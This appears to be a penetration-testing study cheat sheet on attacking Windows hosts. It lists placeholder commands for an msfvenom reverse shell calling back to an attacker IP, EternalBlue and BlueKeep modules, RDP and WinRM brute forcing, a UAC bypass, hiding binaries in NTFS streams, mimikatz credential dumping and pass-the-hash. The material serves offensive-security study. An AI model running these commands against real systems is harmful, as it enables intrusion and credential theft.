# Windows System/Host Based Attacks

## Exploiting Vulnerabilities for Initial Foothold

The most frequently exploited native windows services are:

|     Name      |Protocol|Port Number|
|---------------|--------|-----------|
| Microsoft IIS | TCP    | 80/443    |
| WebDAV        | TCP    | 80/443    |
| SMB/CIFS      | TCP    | 445       |
| RDP           | TCP    | 3389      |
| WinRM         | TCP    | 5985/5986 |

### Exploiting WebDAV 80/443

WebDAV is a extension that enables File interaction to the users on IIS servers.

#### WebDav with cadaver and davtest

`davtest` and `cadaver` are the tools used to attack the service.

- `davtest -url <url>/webdav -auth <user>:<password>`

- `cadaver <url>/webdav` then it will display a prompt 

#### Using CURL

- `curl -T --user '<user>:<password>' '<file_to_upload>' '<url>'` this will upload a file to the server
- `curl -X MKCOL '<url>/<new_dir_name>'` will create a new directory on the server
- `curl -X MOVE --header 'Destination:<url>/<new_path>' '<url>/<file_to_move>'`
- `curl -X DELETE '<url>/<file_to_delete>'` will delete a specified file/dir

#### WebDav with metasploit

Create a revshell with `msfvenom` and then connecto to `metasploit` by using `multi/handler` module

`msfvenom -p <path_to_payload> LHOST=<attacker_ip> LPORT=<attacker_port> -f <output format> -o <output_name>`

Other option is related with using `windows/iis/iis_webdav_upload_asp` module

### Exploiting SMB 139/445

How does SMB authentication works:

1. The client request access to a share
2. The server generates a string and sends it to the client
3. The client generates a hash of the received string by using the user password as the key
4. The server does the same thing as the client with the stored password of the user 
5. The client sends the encrypted string to the server which will compare it against the one that it generated by using the stored password of the user
6. If both strings match then the authentication will be succesful.

#### Using PsExec

A valid user account is needed in order to perform the attack.

`psexec.py <user>@<ip> <command_to_execute>`

#### Using Metasploit

`windows/smb/psexec` module to exploit PsExec

#### SMB EternalBlue

- `nmap -Pn -sV -O <ip>`
- `nmap -Pn -p 445 --script smb-vuln-ms17-010 <ip>`
- `windows/smb/ms17_010_eternalblue` or using eternal blue AutoBlue [exploit from GitHub](https://github.com/3ndG4me/AutoBlue-MS17-010)

### Exploiting RDP 3389/other

It's necesary to get valid user credentials.

#### RDP scanner

`auxiliary/scanner/rdp/rdp_scanner` metasploit module which is usefull when RDP is configured in other port

#### Using hydra to bruteforce

`hydra -L <path_to_user_dict> -P <path_to_passw_dict> rdp://<ip> -s <port>` 

#### RDP BlueKeep

`windows/rdp/cve_2019_0708_bluekeep_rce` this module is used to exploit bluekeep vulnerabilty

### Exploiting WinRM 5985/5986

The tools used for exploiting WinRM service are `crackmapexec` to bruteforce on Win-RM and `evil-winrm` to get a command session by providing a hash to authenticate.

#### Bruteforcing with crackmapexec

- `crackmapexec <protocol> <ip> -u <user_dict> -p <pass_dict>` will perform a bruteforce attack
- `crackmapexec <protocol> <ip> -u <user> -p <pass> -x "<command>"` will execute a command

#### Getting cmd session with evil-winrm

`evil-winrm.rb -u <user> -p <password> -i <ip>`

#### Using metasploit

`windows/winrm/winrm_script_exec`

## Privilege Escalation

### Windows Kernel Exploits

The kernel runs as the most privileged level on the system, but kernel exploits can cause the sytem to crash.

For indentifying kernel vulnerabilities the tools used are:
- [Windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
- `multi/recon/local/local_exploit_suggester` metaploit module that suggest exploits to elevate privs
- `Builtin Kali searchsploit` kali feature connected to Exploit DB

#### Windows exploit suggester

- `windows-exploit-suggester.py --update` will download a vulnerabilty database
- `windows-exploit-suggester.py --database <vulnerabilty_database> --systeminfo <systeminfo_command_output>.txt`

### Bypassing UAC

A tool used to bypass is [UACMe](https://github.com/hfiref0x/UACME)

`Akagi64.exe <technique_number> <path_to_rev_shell>`

### Access Token Impersonation

Consist in stole an access token created by LSASS for a process to execute with elevated privileges and use it to perform a privileges escalation

The privileges needed to replicate the attack are:

- SeAssignPrimaryToken
- SeCreateToken
- SeImpersonateToken

The tools used for the attack can be:

- `incognito` module from meterpreter
- `RoguePotato`, `JuicyPotato` or similars binaries

#### Incognito module

1. `load incognito` will load the module to the meterpreter session
2. `list_tokens -u` will list the availaible tokens
3. `impersonate_token "<token_name>"` will impersonate the given token
4. `pgrep <process_name>` will list the PID of the given process

## File System Vulnerabilities

### Alternate Data Strings

Alternate Data Strings is an NTFS file attribute, it has two streams:

- Data stream: Default stream conatins the data of the file
- Resource stream: contains the metadata of the files

ADS can be used to hide malicious code or executables to evade detection. Storing code or executables in the file attribute resource stream of a legitimate file.

A binary can be hidden into a legitimate txt file by using `type malicious_bin.exe > test.txt:malicious_bin.exe`

Then it can be used with a symbolic link to make things more difficult `mklink <symbolic_link_name> C:\Temp\test.txt:malicious_bin.exe`

## Credential Dumping

### Searching crendentials in Unattend Files

Some unattend files store user accounts credentials encoded in base64 those could be found in:

- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`

Another good option is to use `PowerUp.ps1` script the steps to repoduce it are:

1. Enable execution policy `powershell -ep bypass`
2. Load the module and execute PrivescAudit feature `.\PowerUp.ps1` -> `Invoke-PrivescAudit`

### Dumping Hashes

To dump hashes by using mimikatz is important to run a session with elevated privileges, this is becouse mimikatz will interact with LSASS process to dump the SAM database.

For using mimikatz in metasploit:

- `load kiwi` will load the mimikatz module
- `lsa_dump_sam` will dump SAM DB
- `lsa_dump_secrets` will dump cached sotred password, domain records and user credentials or hashes

It can be done with the mimikatz binary doe:

- `priivlege::debug` will show if the privs are the needed ones
- `sekurlsa::logonpasswords` will dump logon sessions and their plaintext password if applies
- `sekurlsa::minidump lsass` will dump lsass process
- `lsadump::sam` will dump SAM DB
- `lsadump::secrets`

Pypykatz is similar to mimikatz but its written in python:

- `pypykatz.py lsa minidump lsass.dmp` will dump lsass process

### Pass The Hash

In the case of SMB servers allows an user to authenticate throught a hash for it metasploit provides `windows/smb/psexec` module similarly to `psexec.py` script it lets an attacker to obtain a cmd sessions via SMB by providing an user and it hash.

Another tool used to obtain CLI sessions with other protocols is `crackmapexec` -> `crackmapexec <protocol> -u <user> -H <password_hash> -x "<command>"`